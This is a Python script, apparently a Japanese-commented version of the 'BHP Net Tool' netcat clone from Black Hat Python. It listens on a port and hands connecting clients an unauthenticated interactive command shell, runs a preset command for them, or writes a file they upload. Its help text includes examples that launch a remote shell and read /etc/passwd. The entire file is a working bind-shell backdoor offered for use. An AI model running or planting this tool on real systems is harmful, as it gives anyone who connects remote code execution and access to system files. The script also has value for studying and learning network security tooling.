import argparse
import locale
import os
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
    # 前後の空白を除去
    cmd = cmd.strip()
    # cmdがない場合終了
    if not cmd:
        return
    
    # Winの場合shellをTrueにセット
    if os.name == "nt":
        shell = True
    else:
        shell = False

    # コマンドを実行
    output = subprocess.check_output(shlex.split(cmd),
        stderr=subprocess.STDOUT,
        shell=shell)
    
    # 日本語環境の時出力をデコード
    if locale.getdefaultlocale() == ('ja_JP', 'cp932'):
        return output.decode('cp932')
    else:
        return output.decode()

class NetCat:
    # クラスの初期化
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # クラスの実行
    def run(self):
        # listen設定の場合待ち受け
        if self.args.listen:
            self.listen()
        # それ以外の場合送信
        else:
            self.send()

    # 送信処理
    def send(self):
        # コネクション作成
        self.socket.connect((self.args.target, self.args.port))
        # バッファがある場合送信
        if self.buffer:
            self.socket.send(self.buffer)
        
        try:
            # 受信ループ
            while True:
                recv_len = 1
                response = ''
                # 受信データがある限りループ
                while recv_len:
                    # 4096ずつ受信
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    # 受信データが4096以下の場合終了
                    if recv_len < 4096:
                        break

                # 応答がある場合は表示しコマンド入力を要求
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        # Ctrl+Cで終了
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()
        except EOFError as e:
            print(e)
        
    # 受信処理
    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            print("Wating ...")
            client_socket, _ = self.socket.accept()
            # 受信時新規スレッドを作成しハンドラーを起動
            client_thread = threading.Thread(
                target=self.handle, args={client_socket,}
            )
            client_thread.start()

    # コマンド実行用ハンドラー
    def handle(self, client_socket):
        # コマンド実行
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())

        # アップロード実行
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())

        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'<BHP:#> ')
                    # \nを受信するまで受信
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    # 受信コマンドの実行
                    print(f'Excute :{cmd_buffer.decode()}')
                    response = execute(cmd_buffer.decode())

                    # 実行結果の送信
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                
                # サーバ終了処理
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

if __name__ == '__main__':
    
    # ツールのヘルプ
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            '''実行例:
            # 対話型コマンドシェルの起動
            netcat.py -t 192.168.1.108 -p 5555 -l -c
            # ファイルのアップロード
            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt
            # コマンドの実行
            netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\"
            # 通信先サーバの135番ポートに文字列を送信
            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135
            # サーバに接続
            netcat.py -t 192.168.1.108 -p 5555
            Ctrl+D(*nix) or Ctrl+Z(win)
            '''
        )
    )

    # ツールのコマンド説明文
    parser.add_argument('-c', '--command', action='store_true', help='対話型シェルの初期化')
    parser.add_argument('-e', '--execute', help='指定のコマンドの実行')
    parser.add_argument('-l', '--listen', action='store_true', help='通信待受モード')
    parser.add_argument('-p', '--port', type=int, default=5555, help='ポート番号の指定')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='IPアドレスの指定')
    parser.add_argument('-u', '--upload', help='ファイルのアップロード')

    # 標準入力からCtrl+Zまでスクリプト読込
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()
    
    # NetCat初期化と実行
    nc = NetCat(args, buffer.encode())
    nc.run()
